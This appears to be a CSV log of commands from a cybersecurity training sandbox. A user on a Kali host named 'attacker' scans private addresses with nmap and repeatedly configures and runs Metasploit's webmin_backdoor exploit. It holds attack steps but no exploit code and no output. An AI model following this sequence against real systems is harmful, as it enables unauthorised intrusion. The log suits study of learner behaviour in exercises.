sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
685,bash-command,nmap,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:44:14.774Z,1970-01-01T00:03:58.355Z
685,bash-command,nmap,--help,attacker,10.1.135.83,34,kali,2022-05-04T12:44:46.436Z,1970-01-01T00:04:30.017Z
685,bash-command,nmap,-sV 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:46:04.561Z,1970-01-01T00:05:48.142Z
685,bash-command,metasploit,--help,attacker,10.1.135.83,35,kali,2022-05-04T12:47:27.901Z,1970-01-01T00:07:11.482Z
685,bash-command,msfcli,NONE,attacker,10.1.135.83,36,kali,2022-05-04T12:49:28.241Z,1970-01-01T00:09:11.822Z
685,msf-command,search,name:webmin,attacker,10.1.135.83,36,null,2022-05-04T12:53:07.675Z,1970-01-01T00:12:51.256Z
685,msf-command,use,exploit/47230,attacker,10.1.135.83,36,null,2022-05-04T12:53:42.953Z,1970-01-01T00:13:26.534Z
685,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T12:53:57.372Z,1970-01-01T00:13:40.953Z
685,msf-command,set,RHOSTS 172.18.1.15,attacker,10.1.135.83,36,null,2022-05-04T12:54:30.380Z,1970-01-01T00:14:13.961Z
685,msf-command,show,missing,attacker,10.1.135.83,36,null,2022-05-04T12:54:39.635Z,1970-01-01T00:14:23.216Z
685,msf-command,set,LHOST 4567,attacker,10.1.135.83,36,null,2022-05-04T12:56:26.854Z,1970-01-01T00:16:10.435Z
685,msf-command,show,missing,attacker,10.1.135.83,36,null,2022-05-04T12:56:29.427Z,1970-01-01T00:16:13.008Z
685,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T12:56:42.092Z,1970-01-01T00:16:25.673Z
685,msf-command,exit,NONE,attacker,10.1.135.83,36,null,2022-05-04T12:57:12.472Z,1970-01-01T00:16:56.053Z
685,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T12:57:12.624Z,1970-01-01T00:16:56.205Z
685,bash-command,msfcli,NONE,attacker,10.1.135.83,36,kali,2022-05-04T12:57:17.185Z,1970-01-01T00:17:00.766Z
685,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T12:57:49.845Z,1970-01-01T00:17:33.426Z
685,msf-command,show,missing,attacker,10.1.135.83,36,null,2022-05-04T12:57:53.405Z,1970-01-01T00:17:36.986Z
685,msf-command,set,RHOSTS 172.18.1.15,attacker,10.1.135.83,36,null,2022-05-04T12:58:28.151Z,1970-01-01T00:18:11.732Z
685,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T12:59:21.793Z,1970-01-01T00:19:05.374Z
685,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:00:10.281Z,1970-01-01T00:19:53.862Z
685,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T13:00:29.966Z,1970-01-01T00:20:13.547Z
685,msf-command,set,RHOSTS 172.18.1.15:10000,attacker,10.1.135.83,36,null,2022-05-04T13:01:20.137Z,1970-01-01T00:21:03.718Z
685,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:01:29.648Z,1970-01-01T00:21:13.229Z
685,msf-command,set,RHOSTS 172.18.1.15,attacker,10.1.135.83,36,null,2022-05-04T13:01:35.140Z,1970-01-01T00:21:18.721Z
685,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:01:40.223Z,1970-01-01T00:21:23.804Z
685,msf-command,set,autocheck false,attacker,10.1.135.83,36,null,2022-05-04T13:01:49.929Z,1970-01-01T00:21:33.510Z
685,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:02:02.448Z,1970-01-01T00:21:46.029Z
685,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T13:03:03.291Z,1970-01-01T00:22:46.872Z
685,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:03:12.808Z,1970-01-01T00:22:56.389Z
685,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T13:03:43.222Z,1970-01-01T00:23:26.803Z
